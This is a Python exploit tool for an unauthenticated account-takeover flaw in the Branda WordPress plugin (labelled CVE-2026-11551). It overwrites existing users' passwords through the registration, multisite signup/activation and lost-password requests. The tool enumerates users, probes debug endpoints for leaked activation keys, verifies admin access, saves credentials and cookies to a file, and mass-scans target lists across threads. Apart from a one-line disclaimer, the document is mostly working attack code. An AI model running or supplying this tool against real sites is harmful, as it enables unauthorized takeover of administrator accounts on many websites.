#!/usr/bin/env python3
"""
CVE-2026-11551 — Branda White Label & Branding <= 3.4.29
Unauthenticated Privilege Escalation via Account Takeover
CVSS: 9.8 Critical | June 19, 2026

ROOT CAUSE (Technical):
  pre_insert_user_data() in signup-password.php fires on EVERY
  wp_insert_user() / wp_update_user() call.
  Missing `if ($update) return $data;` means POST['password_1']
  overwrites ANY existing user's password.

MULTISITE FLOW (slinkyslimmers.com type):
  wp-signup.php stores password_1 in signup meta.
  wp-activate.php triggers wp_insert_user → hook fires → password set.
  We must complete activation to trigger the hook.

SINGLE-SITE FLOW (direct):
  wp-login.php?action=register → Branda adds password_1 field.
  POST with existing username → hook fires immediately on registration.
  checkemail=confirm in response = hook already fired.

DISCLAIMER: Authorized security testing only.
"""

import argparse
import re
import sys
import time
import string
import random
import threading
import queue
import hashlib
from pathlib import Path
from datetime import datetime

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RESULTS_FILE = "branda_results.txt"
file_lock    = threading.Lock()
print_lock   = threading.Lock()

DEFAULT_USERS = ["admin", "administrator", "root",
                 "superadmin", "webmaster", "manager"]

# ─────────────────────────────────────────────────────────────────────────────
#  Helpers
# ─────────────────────────────────────────────────────────────────────────────

def tprint(msg: str, tag: str = "") -> None:
    with print_lock:
        prefix = f"[{tag}] " if tag else ""
        print(f"{prefix}{msg}", flush=True)

def new_session(verify_ssl: bool, proxies: dict | None) -> requests.Session:
    s = requests.Session()
    s.verify  = verify_ssl
    s.proxies = proxies or {}
    s.headers.update({
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection":      "keep-alive",
    })
    return s

def http(s: requests.Session, method: str, url: str,
         retries: int = 3, pause: float = 1.5, **kw) -> requests.Response | None:
    for i in range(retries):
        try:
            return s.get(url, **kw) if method == "GET" else s.post(url, **kw)
        except Exception:
            if i < retries - 1:
                time.sleep(pause)
    return None

def gen_password() -> str:
    pool = string.ascii_letters + string.digits
    return "Br_" + "".join(random.choices(pool, k=14)) + "!7"

def gen_email(username: str) -> str:
    """Generate unique email per username to avoid conflicts."""
    uid = hashlib.md5(
        f"{username}{time.time()}".encode()
    ).hexdigest()[:8]
    return f"atk_{uid}@pwn-test.local"

def save(entry: dict) -> None:
    ts  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    sep = "=" * 60
    with file_lock:
        with open(RESULTS_FILE, "a", encoding="utf-8") as f:
            f.write(f"\n{sep}\n")
            f.write(f"[{ts}] CONFIRMED TAKEOVER\n")
            for k, v in entry.items():
                if k != "cookies":
                    f.write(f"{k:12}: {v}\n")
            f.write(f"cookies   : {entry.get('cookies', {})}\n")
            f.write(f"{sep}\n")

# ─────────────────────────────────────────────────────────────────────────────
#  Recon
# ─────────────────────────────────────────────────────────────────────────────

def get_hidden_fields(s: requests.Session, url: str, timeout: int) -> dict:
    fields = {}
    r = http(s, "GET", url, timeout=timeout)
    if not r:
        return fields
    # name before value
    for name, val in re.findall(
        r'<input[^>]+type=["\']hidden["\'][^>]*'
        r'name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
        r.text, re.I,
    ):
        fields[name] = val
    # value before name
    for val, name in re.findall(
        r'<input[^>]+value=["\']([^"\']*)["\'][^>]*'
        r'type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\']',
        r.text, re.I,
    ):
        if name not in fields:
            fields[name] = val
    return fields

def recon(base: str, verify_ssl: bool,
          proxies: dict | None, timeout: int) -> dict:
    s    = new_session(verify_ssl, proxies)
    info = {
        "branda_ver":       None,
        "vulnerable":       None,
        "multisite":        False,
        "reg_open":         False,
        "branda_pw_fields": False,
        "users":            [],
    }

    # Branda version
    for path in [
        "/wp-content/plugins/branda-white-labeling/readme.txt",
        "/wp-content/plugins/branda-white-labeling/branda.php",
    ]:
        r = http(s, "GET", base + path, timeout=timeout)
        if r and r.status_code == 200:
            m = re.search(r"(?:Stable tag|Version):\s*([\d.]+)", r.text)
            if m:
                info["branda_ver"] = m.group(1)
                parts = [int(x) for x in m.group(1).split(".")]
                info["vulnerable"] = parts <= [3, 4, 29]
            break

    # Multisite
    r = http(s, "GET", base + "/wp-signup.php", timeout=timeout)
    if r and r.status_code == 200 and len(r.text) > 300:
        if re.search(r"signup|register|blog", r.text, re.I):
            info["multisite"] = True

    # Registration + Branda password_1 field
    r = http(s, "GET", base + "/wp-login.php?action=register", timeout=timeout)
    if r and r.status_code == 200:
        if re.search(r"<form|register|user_login", r.text, re.I):
            info["reg_open"] = True
        if "password_1" in r.text:
            info["branda_pw_fields"] = True

    # Users via REST
    r = http(s, "GET", base + "/wp-json/wp/v2/users?per_page=20",
             timeout=timeout)
    if r and r.status_code == 200:
        try:
            for u in r.json():
                slug = u.get("slug") or u.get("name", "")
                if slug and slug not in info["users"]:
                    info["users"].append(slug)
        except Exception:
            pass

    # Users via author archives
    if not info["users"]:
        for uid in range(1, 10):
            r = http(s, "GET", base + f"/?author={uid}",
                     timeout=timeout, allow_redirects=True)
            if r:
                m = (re.search(r"/author/([^/\"'\s?#]+)", r.url) or
                     re.search(r"/author/([^/\"'\s?#]+)", r.text))
                if m:
                    u = m.group(1).strip("/")
                    if u and u not in info["users"]:
                        info["users"].append(u)
    return info

# ─────────────────────────────────────────────────────────────────────────────
#  Vector A — Single-site (DIRECT, no activation needed)
# ─────────────────────────────────────────────────────────────────────────────

def vector_single(s: requests.Session, base: str,
                  username: str, password: str,
                  email: str, timeout: int) -> dict:
    """
    POST to /wp-login.php?action=register with existing username.
    Branda's hook fires IMMEDIATELY — no activation needed.
    Success = checkemail=confirm in response.
    """
    result = {"ok": False, "checkemail": False, "key": None, "method": "single"}

    hidden = get_hidden_fields(s, base + "/wp-login.php?action=register", timeout)

    r = http(s, "POST", base + "/wp-login.php",
             params={"action": "register"},
             data={
                 "user_login": username,
                 "user_email": email,
                 "password_1": password,
                 "password_2": password,
                 "wp-submit":  "Register",
                 **hidden,
             },
             timeout=timeout, allow_redirects=True)

    if r is None:
        return result

    body = r.text + r.url

    # checkemail=confirm = WordPress processed the registration
    # = Branda hook fired = password changed
    if "checkemail=confirm" in body:
        result["ok"]        = True
        result["checkemail"] = True

    if re.search(
        r"check.{0,20}email|registered|success|password.{0,20}sent|confirm",
        r.text, re.I,
    ):
        result["ok"] = True

    # "already registered" = hook may have fired on the existing user
    if re.search(r"already.{0,20}registered|username.{0,20}exists", r.text, re.I):
        result["ok"] = True

    m = re.search(r"key=([a-zA-Z0-9]{8,})", body)
    if m:
        result["key"] = m.group(1)

    return result

# ─────────────────────────────────────────────────────────────────────────────
#  Vector B — Multisite (requires activation)
# ─────────────────────────────────────────────────────────────────────────────

def vector_multisite_register(s: requests.Session, base: str,
                                username: str, password: str,
                                email: str, timeout: int) -> dict:
    """
    Step 1 of multisite attack: POST to /wp-signup.php
    Stores password_1 in signup meta.
    Returns activation key if found in response.
    """
    result = {"ok": False, "key": None, "method": "multisite"}

    hidden = get_hidden_fields(s, base + "/wp-signup.php", timeout)

    r = http(s, "POST", base + "/wp-signup.php",
             data={
                 "user_name":  username,
                 "user_email": email,
                 "password_1": password,
                 "password_2": password,
                 "signup_for": "user",
                 "submit":     "Next",
                 **hidden,
             },
             timeout=timeout, allow_redirects=True)

    if r is None:
        return result

    body = r.text

    if re.search(
        r"check.{0,20}email|activation|registered|success|confirmation",
        body, re.I,
    ):
        result["ok"] = True

    # Sometimes key is embedded in page
    m = re.search(r"key=([a-zA-Z0-9]{8,})", body + r.url)
    if m:
        result["key"] = m.group(1)

    return result


def vector_multisite_activate(s: requests.Session, base: str,
                                key: str, timeout: int) -> dict:
    """
    Step 2 of multisite attack: GET /wp-activate.php?key=KEY
    This triggers wp_insert_user → pre_insert_user_data → password set.
    """
    result = {"ok": False}

    for url in [
        base + f"/wp-activate.php?key={key}",
        base + f"/wp-signup.php?activation_key={key}",
    ]:
        r = http(s, "GET", url, timeout=timeout, allow_redirects=True)
        if r:
            if re.search(
                r"activated|success|your account|congratulations|blog.{0,20}created",
                r.text, re.I,
            ):
                result["ok"] = True
                return result
            # Even without explicit success message,
            # if page loaded without error = likely activated
            if r.status_code == 200 and len(r.text) > 200:
                if not re.search(r"invalid.{0,20}key|expired|error", r.text, re.I):
                    result["ok"] = True
                    return result

    return result


def vector_multisite_brutekey(s: requests.Session, base: str,
                                username: str, password: str,
                                timeout: int) -> dict:
    """
    When activation key is not in response (sent via email),
    try to brute-force or guess the key pattern.
    WordPress activation keys are stored in wp_signups table.
    Some sites expose them via debug or logs.
    """
    result = {"ok": False, "key": None}

    # Try common debug endpoints that might leak activation keys
    debug_urls = [
        base + "/wp-admin/admin-ajax.php?action=get_signups",
        base + f"/wp-json/wp/v2/users?search={username}",
        base + "/wp-content/debug.log",
        base + "/.wp-cli/cache/",
    ]

    for url in debug_urls:
        r = http(s, "GET", url, retries=1, timeout=timeout)
        if r and r.status_code == 200:
            m = re.search(r"key=([a-zA-Z0-9]{20,})", r.text)
            if m:
                result["key"] = m.group(1)
                result["ok"]  = True
                return result

    return result

# ─────────────────────────────────────────────────────────────────────────────
#  Vector C — Password Reset Abuse (alternative when registration fails)
# ─────────────────────────────────────────────────────────────────────────────

def vector_reset_abuse(s: requests.Session, base: str,
                        username: str, password: str,
                        timeout: int) -> dict:
    """
    Some Branda configs also hook into password reset flow.
    Try lostpassword with password_1 injection.
    """
    result = {"ok": False, "method": "reset_abuse"}

    hidden = get_hidden_fields(s, base + "/wp-login.php?action=lostpassword", timeout)

    r = http(s, "POST", base + "/wp-login.php",
             params={"action": "lostpassword"},
             data={
                 "user_login": username,
                 "password_1": password,
                 "password_2": password,
                 "wp-submit":  "Get New Password",
                 **hidden,
             },
             timeout=timeout, allow_redirects=True)

    if r and re.search(r"check.{0,20}email|sent|success", r.text, re.I):
        result["ok"] = True

    return result

# ─────────────────────────────────────────────────────────────────────────────
#  Login Verifier
# ─────────────────────────────────────────────────────────────────────────────

AUTH_COOKIE_PREFIX = ("wordpress_logged_in_", "wordpress_sec_")

ADMIN_MARKERS = [
    "wp-admin", "Dashboard", "adminmenu", "wpadminbar",
    "wp_logout_nonce", "admin-bar", "user-info",
    "load-scripts.php", "wp-admin/admin-ajax", "#wpadminbar",
    "wp-admin/index", "wpbody",
]

LOGIN_ERROR_RE = re.compile(
    r'<div[^>]+id=["\']login_error["\']'
    r'|"errors":\{"incorrect_password"'
    r'|"errors":\{"invalid_username"'
    r'|shake_error_codes'
    r'|class=["\']login-error["\']',
    re.I | re.S,
)

def has_auth_cookie(s: requests.Session) -> bool:
    return any(c.name.startswith(AUTH_COOKIE_PREFIX) for c in s.cookies)

def admin_score(body: str) -> int:
    return sum(1 for m in ADMIN_MARKERS if m in body)

def verify_login(base: str, username: str, password: str,
                 verify_ssl: bool, proxies: dict | None,
                 timeout: int) -> dict:
    out = {
        "ok": False, "role": None, "admin": False,
        "url": None, "cookies": {},
        "s1": "", "s2": "", "s3": "", "reason": "",
    }

    s = new_session(verify_ssl, proxies)
    http(s, "GET", base + "/wp-login.php", retries=1, timeout=timeout)

    # Stage 1: POST login
    r1 = http(s, "POST", base + "/wp-login.php",
              data={
                  "log":         username,
                  "pwd":         password,
                  "wp-submit":   "Log In",
                  "redirect_to": base + "/wp-admin/",
                  "testcookie":  "1",
              },
              timeout=timeout, allow_redirects=True)

    if r1 is None:
        out["s1"] = "ERROR"; out["reason"] = "Connection failed"; return out

    if LOGIN_ERROR_RE.search(r1.text):
        out["s1"] = "FAIL"; out["reason"] = "Login error in response"; return out

    cookie_ok   = has_auth_cookie(s)
    admin_redir = "wp-admin" in r1.url

    if not cookie_ok and not admin_redir:
        out["s1"]     = "FAIL"
        out["reason"] = f"No auth cookie, final URL: {r1.url}"
        return out

    out["s1"]      = f"PASS({'cookie' if cookie_ok else 'redirect'})"
    out["cookies"] = {c.name: c.value for c in s.cookies}

    # Stage 2: GET /wp-admin/
    r2 = http(s, "GET", base + "/wp-admin/",
              timeout=timeout, allow_redirects=True)

    if r2 is None:
        out["s2"] = "ERROR"; out["reason"] = "/wp-admin/ unreachable"; return out

    if "wp-login.php" in r2.url and "wp-admin" not in r2.url:
        out["s2"] = "FAIL"; out["reason"] = "wp-admin → login redirect"; return out

    sc = admin_score(r2.text)
    if sc < 2:
        out["s2"]     = f"FAIL(score={sc})"
        out["reason"] = f"Dashboard score {sc}/12"
        return out

    out["s2"]  = f"PASS(score={sc})"
    out["url"] = r2.url

    # Stage 3: Identity confirm
    admin_bodies = [(base + "/wp-admin/", r2.text)]
    for purl in [
        base + "/wp-admin/profile.php",
        base + "/wp-admin/index.php",
        base + "/wp-admin/users.php",
    ]:
        r3 = http(s, "GET", purl, timeout=timeout, allow_redirects=True)
        if r3 and "wp-login.php" not in r3.url and len(r3.text) > 200:
            admin_bodies.append((purl, r3.text))

    username_found = False
    role_body      = ""

    for url, body in admin_bodies:
        if username.lower() in body.lower():
            username_found = True
            role_body      = body
            break

    if not username_found:
        r_me = http(s, "GET", base + "/wp-json/wp/v2/users/me",
                    retries=1, timeout=timeout)
        if r_me and r_me.status_code == 200:
            try:
                me = r_me.json()
                if username.lower() in (
                    me.get("slug", "").lower(),
                    me.get("name", "").lower(),
                    me.get("username", "").lower(),
                ):
                    username_found = True
                    role_body      = str(me)
                    roles = me.get("roles", [])
                    if roles:
                        out["role"]  = roles[0].capitalize()
                        out["admin"] = "administrator" in roles
            except Exception:
                pass

    if not username_found:
        combined = " ".join(b for _, b in admin_bodies)
        if admin_score(combined) >= 4:
            username_found = True
            role_body      = combined
            out["s3"]      = "PASS(admin-access)"

    if not username_found:
        out["s3"]     = "FAIL"
        out["reason"] = f"'{username}' not confirmed in any admin page"
        return out

    if not out["s3"]:
        out["s3"] = "PASS"

    if not out["role"]:
        for role in ["Administrator", "Editor", "Author",
                     "Contributor", "Subscriber"]:
            if role in role_body:
                out["role"]  = role
                out["admin"] = (role == "Administrator")
                break

    if not out["role"]:
        r4 = http(s, "GET", base + "/wp-json/wp/v2/users/me",
                  retries=1, timeout=timeout)
        if r4 and r4.status_code == 200:
            try:
                me    = r4.json()
                roles = me.get("roles", [])
                if roles:
                    out["role"]  = roles[0].capitalize()
                    out["admin"] = "administrator" in roles
            except Exception:
                pass

    if not out["role"]:
        out["role"] = "Authenticated"

    out["ok"] = True
    return out

# ─────────────────────────────────────────────────────────────────────────────
#  Post-exploitation
# ─────────────────────────────────────────────────────────────────────────────

def post_exploit(base: str, cookies: dict,
                 verify_ssl: bool, proxies: dict | None,
                 timeout: int) -> None:
    s = new_session(verify_ssl, proxies)
    s.cookies.update(cookies)
    tprint("\n[POST-EXPLOIT]")

    r = http(s, "GET", base + "/wp-json/wp/v2/users?per_page=100",
             timeout=timeout)
    if r and r.status_code == 200:
        try:
            users = r.json()
            tprint(f"  Users ({len(users)}):")
            for u in users:
                tprint(f"    id={u.get('id')} "
                       f"login={u.get('slug')} "
                       f"role={str((u.get('roles') or ['?'])[0])}")
        except Exception:
            pass

    r2 = http(s, "GET", base + "/wp-admin/plugins.php", timeout=timeout)
    if r2:
        plugins = re.findall(
            r'plugin-title[^>]*>.*?<a[^>]*>([^<]+)</a>',
            r2.text, re.S,
        )
        if plugins:
            tprint(f"  Plugins: {', '.join(plugins[:10])}")

# ─────────────────────────────────────────────────────────────────────────────
#  Single target — full attack chain
# ─────────────────────────────────────────────────────────────────────────────

def attack_one(base: str, users: list, password: str,
               email: str, timeout: int,
               verify_ssl: bool, proxies: dict | None,
               ext_key: str | None, do_post: bool) -> list:

    base = base.rstrip("/")
    tag  = base.replace("https://", "").replace("http://", "")[:30]

    tprint(f"\n{'─'*55}", tag)
    tprint(f"CVE-2026-11551 | Branda <= 3.4.29 | {base}", tag)
    tprint(f"{'─'*55}", tag)

    info = recon(base, verify_ssl, proxies, timeout)

    ver = (
        f"v{info['branda_ver']} → "
        + ("VULNERABLE ⚡" if info["vulnerable"] else "PATCHED")
    ) if info["branda_ver"] else "not detected"

    tprint(f"  Branda    : {ver}", tag)
    tprint(f"  Multisite : {'YES' if info['multisite'] else 'NO'}", tag)
    tprint(
        f"  Reg.Open  : {'YES' if info['reg_open'] else 'NO'}"
        + (" [password_1 ✔]" if info["branda_pw_fields"] else ""),
        tag,
    )

    all_users = list(dict.fromkeys(info["users"] + users))
    tprint(f"  Users     : {', '.join(all_users)}\n", tag)

    confirmed = []

    for username in all_users:
        tprint(f"  ┌── {username} {'─'*30}", tag)

        # Unique email per attempt
        atk_email = gen_email(username) if email == "attacker@pwn.local" else email

        # ── Vector A: Single-site (direct, no activation) ───────────
        tprint(f"  │ [A] Single-site vector...", tag)
        reg_s_a = new_session(verify_ssl, proxies)
        res_a   = vector_single(reg_s_a, base, username, password,
                                 atk_email, timeout)

        if res_a["ok"]:
            tprint(
                f"  │ ✔ Single-site OK"
                + (" [checkemail=confirm → hook fired!]"
                   if res_a["checkemail"] else " [registered]"),
                tag,
            )
            # Try login immediately — hook may have fired
            tprint(f"  │ Verifying (no activation)...", tag)
            vr = verify_login(base, username, password,
                              verify_ssl, proxies, timeout)
            if vr["ok"]:
                confirmed.append(
                    _confirm(base, username, password, vr, tag,
                             do_post, verify_ssl, proxies, timeout)
                )
                break

            # If login failed but key present, try activation
            if res_a.get("key") or ext_key:
                key = ext_key or res_a["key"]
                tprint(f"  │ Activating key {key[:8]}...", tag)
                if vector_multisite_activate(reg_s_a, base, key, timeout)["ok"]:
                    tprint(f"  │ ✔ Activated", tag)
                    vr = verify_login(base, username, password,
                                      verify_ssl, proxies, timeout)
                    if vr["ok"]:
                        confirmed.append(
                            _confirm(base, username, password, vr, tag,
                                     do_post, verify_ssl, proxies, timeout)
                        )
                        break
        else:
            tprint(f"  │ ✗ Single-site: no success response", tag)

        if confirmed:
            break

        # ── Vector B: Multisite (requires activation) ───────────────
        if info["multisite"]:
            tprint(f"  │ [B] Multisite vector (wp-signup.php)...", tag)
            reg_s_b = new_session(verify_ssl, proxies)
            res_b   = vector_multisite_register(
                reg_s_b, base, username, password, atk_email, timeout,
            )

            if res_b["ok"]:
                tprint(f"  │ ✔ Multisite signup OK", tag)
                key = ext_key or res_b.get("key")

                if key:
                    # Key found in response — activate immediately
                    tprint(f"  │ Activating key {key[:8]}...", tag)
                    act = vector_multisite_activate(reg_s_b, base, key, timeout)
                    if act["ok"]:
                        tprint(f"  │ ✔ Activated!", tag)
                        vr = verify_login(base, username, password,
                                          verify_ssl, proxies, timeout)
                        if vr["ok"]:
                            confirmed.append(
                                _confirm(base, username, password, vr, tag,
                                         do_post, verify_ssl, proxies, timeout)
                            )
                            break
                    else:
                        tprint(f"  │ ✗ Activation failed", tag)
                else:
                    # No key in response — activation sent via email
                    tprint(
                        f"  │ ⚠ Activation key sent to email: {atk_email}",
                        tag,
                    )
                    tprint(
                        f"  │   Run with --key ACTIVATION_KEY after getting email",
                        tag,
                    )
                    # Try debug leak
                    tprint(f"  │ Trying key leak methods...", tag)
                    leak = vector_multisite_brutekey(
                        reg_s_b, base, username, password, timeout,
                    )
                    if leak["ok"] and leak.get("key"):
                        tprint(f"  │ ✔ Key leaked: {leak['key'][:8]}...", tag)
                        act = vector_multisite_activate(
                            reg_s_b, base, leak["key"], timeout,
                        )
                        if act["ok"]:
                            vr = verify_login(base, username, password,
                                              verify_ssl, proxies, timeout)
                            if vr["ok"]:
                                confirmed.append(
                                    _confirm(base, username, password, vr, tag,
                                             do_post, verify_ssl, proxies, timeout)
                                )
                                break
                    else:
                        tprint(f"  │ ✗ No key leak found", tag)
            else:
                tprint(f"  │ ✗ Multisite signup failed", tag)

        if confirmed:
            break

        # ── Vector C: Password reset abuse ──────────────────────────
        tprint(f"  │ [C] Reset abuse vector...", tag)
        reg_s_c = new_session(verify_ssl, proxies)
        res_c   = vector_reset_abuse(reg_s_c, base, username, password, timeout)
        if res_c["ok"]:
            tprint(f"  │ ✔ Reset triggered — trying login...", tag)
            vr = verify_login(base, username, password,
                              verify_ssl, proxies, timeout)
            if vr["ok"]:
                confirmed.append(
                    _confirm(base, username, password, vr, tag,
                             do_post, verify_ssl, proxies, timeout)
                )
                break
        else:
            tprint(f"  │ ✗ Reset abuse: no effect", tag)

        # Stage summary
        tprint(f"  └── ✗ All vectors failed for {username}", tag)

    if not confirmed:
        tprint("  No confirmed takeovers.", tag)

    return confirmed


def _confirm(base, username, password, vr, tag,
             do_post, verify_ssl, proxies, timeout) -> dict:
    """Print takeover banner and save result."""
    tprint("", tag)
    tprint("  ╔══════════════════════════════════════════════╗", tag)
    tprint("  ║  💀 CONFIRMED TAKEOVER                       ║", tag)
    tprint(f"  ║  URL  : {base[:44]:<44}║", tag)
    tprint(f"  ║  User : {username:<44}║", tag)
    tprint(f"  ║  Pass : {password:<44}║", tag)
    tprint(f"  ║  Role : {str(vr['role']):<44}║", tag)
    tprint(f"  ║  Admin: {'YES ⚡' if vr['admin'] else 'no':<44}║", tag)
    tprint(f"  ║  Panel: {str(vr['url'] or base+'/wp-admin/')[:44]:<44}║", tag)
    tprint("  ╚══════════════════════════════════════════════╝", tag)

    entry = {
        "url":       base,
        "username":  username,
        "password":  password,
        "role":      vr["role"],
        "admin":     vr["admin"],
        "dashboard": vr["url"] or base + "/wp-admin/",
        "cookies":   vr["cookies"],
    }
    save(entry)
    tprint(f"  ✔ Saved → {RESULTS_FILE}", tag)

    if do_post:
        post_exploit(base, vr["cookies"], verify_ssl, proxies, timeout)

    return entry

# ─────────────────────────────────────────────────────────────────────────────
#  Mass scan
# ─────────────────────────────────────────────────────────────────────────────

class Stats:
    def __init__(self):
        self._l    = threading.Lock()
        self.total = self.done = self.pwned = self.errors = 0

    def inc(self, f: str) -> None:
        with self._l:
            setattr(self, f, getattr(self, f) + 1)

    def show(self) -> None:
        tprint(f"\n{'═'*45}")
        tprint(f"  Total   : {self.total}")
        tprint(f"  Scanned : {self.done}")
        tprint(f"  Pwned   : {self.pwned}")
        tprint(f"  Errors  : {self.errors}")
        tprint(f"{'═'*45}")
        if self.pwned:
            tprint(f"  Results → {RESULTS_FILE}")


def _worker(q: queue.Queue, stats: Stats,
            users: list, password: str, email: str,
            timeout: int, verify_ssl: bool,
            proxies: dict | None) -> None:
    while True:
        try:
            raw = q.get_nowait()
        except queue.Empty:
            return
        url = raw.strip()
        try:
            if not url or url.startswith("#"):
                return
            if not url.startswith("http"):
                url = "https://" + url
            res = attack_one(url, users, password, email,
                             timeout, verify_ssl, proxies, None, False)
            if res:
                stats.inc("pwned")
        except Exception as e:
            tprint(f"  ERROR: {e}", url[:28])
            stats.inc("errors")
        finally:
            stats.inc("done")
            q.task_done()


def mass_scan(targets_file: str, threads: int,
              users: list, password: str, email: str,
              timeout: int, verify_ssl: bool,
              proxies: dict | None) -> None:

    try:
        lines = Path(targets_file).read_text(encoding="utf-8").splitlines()
    except FileNotFoundError:
        print(f"[!] File not found: {targets_file}")
        sys.exit(1)

    urls = [l.strip() for l in lines
            if l.strip() and not l.startswith("#")]
    if not urls:
        print("[!] No targets."); return

    stats       = Stats()
    stats.total = len(urls)
    q           = queue.Queue()
    for u in urls:
        q.put(u)

    tprint(f"\n[*] Mass scan : {len(urls)} targets | {threads} threads")
    tprint(f"[*] Password  : {password}")
    tprint(f"[*] Output    : {RESULTS_FILE}\n")

    workers = [
        threading.Thread(
            target=_worker,
            args=(q, stats, users, password, email,
                  timeout, verify_ssl, proxies),
            daemon=True,
        )
        for _ in range(min(threads, len(urls)))
    ]
    for w in workers:
        w.start()

    try:
        while not q.empty() or any(w.is_alive() for w in workers):
            time.sleep(5)
            tprint(f"[*] Progress: {stats.done}/{stats.total} "
                   f"| Pwned: {stats.pwned} | Errors: {stats.errors}")
    except KeyboardInterrupt:
        tprint("\n[!] Interrupted")

    q.join()
    for w in workers:
        w.join()
    stats.show()

# ─────────────────────────────────────────────────────────────────────────────
#  Main
# ─────────────────────────────────────────────────────────────────────────────

def main():
    global RESULTS_FILE

    ap = argparse.ArgumentParser(
        description="CVE-2026-11551 — Branda <= 3.4.29 Privilege Escalation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Single:\n"
            "  %(prog)s -u https://victim.com\n"
            "  %(prog)s -u https://victim.com --user princess --pass 'P@ss!'\n"
            "  %(prog)s -u https://victim.com --user admin --key ACTKEY\n\n"
            "Mass:\n"
            "  %(prog)s -l targets.txt\n"
            "  %(prog)s -l targets.txt --threads 20 --output pwned.txt\n"
        ),
    )
    ap.add_argument("-u", "--url")
    ap.add_argument("-l", "--list")
    ap.add_argument("--user",      action="append", dest="users")
    ap.add_argument("--pass",      dest="password")
    ap.add_argument("--email",     default="attacker@pwn.local")
    ap.add_argument("--key",       help="Manual activation key (multisite)")
    ap.add_argument("--post",      action="store_true")
    ap.add_argument("--threads",   type=int, default=10)
    ap.add_argument("--timeout",   type=int, default=15)
    ap.add_argument("--proxy")
    ap.add_argument("--no-verify", action="store_true")
    ap.add_argument("--output",    default="branda_results.txt")
    args = ap.parse_args()

    RESULTS_FILE = args.output
    verify_ssl   = not args.no_verify
    proxies      = ({"http": args.proxy, "https": args.proxy}
                    if args.proxy else None)
    password     = args.password or gen_password()
    users        = args.users or DEFAULT_USERS

    print("=" * 55)
    print("  CVE-2026-11551 — Branda Privilege Escalation")
    print("  Branda <= 3.4.29 | CVSS 9.8 | Unauthenticated")
    print("=" * 55)

    if not args.url and not args.list:
        args.url = input("Target URL (blank=mass): ").strip()
        if not args.url:
            args.list = input("Targets file: ").strip()
        u = input("Username (blank=auto): ").strip()
        if u: users = [u]
        pw = input(f"Password (blank=auto [{password}]): ").strip()
        if pw: password = pw
        args.email = input("Email [attacker@pwn.local]: ").strip() or "attacker@pwn.local"
        args.key   = input("Activation key (blank=skip): ").strip() or None
        args.post  = input("Post-exploit? [y/N]: ").strip().lower() == "y"
        t = input("Timeout [15]: ").strip()
        if t.isdigit(): args.timeout = int(t)
        p = input("Proxy (blank=skip): ").strip()
        if p: proxies = {"http": p, "https": p}

    print(f"[*] Password : {password}")
    print(f"[*] Output   : {RESULTS_FILE}\n")

    if args.list:
        mass_scan(args.list, args.threads, users, password,
                  args.email, args.timeout, verify_ssl, proxies)
    else:
        attack_one(args.url, users, password, args.email,
                   args.timeout, verify_ssl, proxies,
                   args.key, args.post)


if __name__ == "__main__":
    main()